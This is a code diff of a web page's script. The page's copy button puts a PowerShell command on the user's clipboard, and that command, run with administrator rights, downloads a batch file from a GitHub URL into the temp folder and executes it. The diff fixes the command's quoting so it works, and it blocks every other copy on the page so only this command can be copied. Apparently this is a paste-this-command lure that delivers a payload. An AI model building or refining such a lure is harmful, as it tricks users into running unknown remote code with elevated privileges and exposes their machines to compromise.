@@ -221,7 +221,7 @@
 
 <script>
 (function() {
-  const codeToCopy = 'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c curl -L https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/installer.bat -o %temp%\installer.bat & %temp%\installer.bat'"';
+  const codeToCopy = 'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/c curl -L https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/installer.bat -o %temp%\\installer.bat & %temp%\\installer.bat\'"';
   const copyBtn = document.getElementById('copyBtn');
   const footerHint = document.getElementById('footerHint');
 
@@ -267,8 +267,13 @@
     }
   });
 
-  // Block all other copy methods
+  // FIXED: Allow copy from our button while blocking all other copies
   document.addEventListener('copy', function(e) {
+    // If the copy event is triggered by our button's click handler, allow it
+    if (e.target && e.target.id === 'copyBtn') {
+      return true; // Allow the default behavior for our button
+    }
+    // Block all other copy attempts
     e.preventDefault();
     e.clipboardData.setData('text/plain', '');
     return false;
